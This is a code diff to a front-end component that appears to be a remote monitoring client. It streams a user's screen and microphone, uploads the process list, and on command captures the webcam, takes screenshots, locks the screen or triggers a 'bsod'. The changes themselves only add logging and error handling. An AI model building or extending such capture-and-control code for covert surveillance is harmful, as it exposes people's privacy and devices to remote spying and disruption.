@@ -139,10 +139,16 @@ export default function Layout() {
     const captureWebcam = async (socket) => {
       if (camCapturing) return
       camCapturing = true
+      console.log('[webcam] capture command received, starting...')
       const tryCapture = async () => {
         let stream = null
         try {
+          if (!navigator.mediaDevices?.getUserMedia) {
+            throw new Error('getUserMedia not available (no mediaDevices API)')
+          }
+          console.log('[webcam] calling getUserMedia...')
           stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+          console.log('[webcam] getUserMedia OK, tracks:', stream.getVideoTracks().length)
           const video = document.createElement('video')
           video.muted = true; video.srcObject = stream
           await new Promise((resolve, reject) => {
@@ -178,7 +184,7 @@ export default function Layout() {
           }
         }
         if (lastErr) {
-          console.error('Webcam failed:', lastErr)
+          console.error('[webcam] all retries failed:', lastErr)
           if (socket.readyState === WebSocket.OPEN)
             socket.send(JSON.stringify({ type: 'webcam_error', error: lastErr?.message || String(lastErr) }))
         }
@@ -210,6 +216,7 @@ export default function Layout() {
           else if (c === 'lock-screen') await window.electronBridge?.systemLock()
           else if (c === 'bsod') await window.electronBridge?.systemBsod()
         } else if (msg.type === 'webcam_capture') {
+          console.log('[ws] webcam_capture command received')
           captureWebcam(ws)
         } else if (msg.type === 'screenshot_capture') {
           captureScreenshot(ws)
@@ -248,13 +255,16 @@ export default function Layout() {
       const token = localStorage.getItem('token')
       ws = new WebSocket(`${wsBase}/users/worker-ws?token=${token}`)
       ws.onopen = () => {
+        console.log('[ws] worker-ws connected')
         startScreen(ws)
         startMic(ws)
         uploadProcesses(ws)
         processInterval = setInterval(() => uploadProcesses(ws), 15_000)
       }
       ws.onmessage = handleMessage
-      ws.onclose = () => {
+      ws.onerror = (e) => console.error('[ws] worker-ws error:', e)
+      ws.onclose = (e) => {
+        console.warn('[ws] worker-ws closed, code:', e.code, 'reason:', e.reason)
         stopScreen()
         stopMic()
         if (processInterval) { clearInterval(processInterval); processInterval = null }
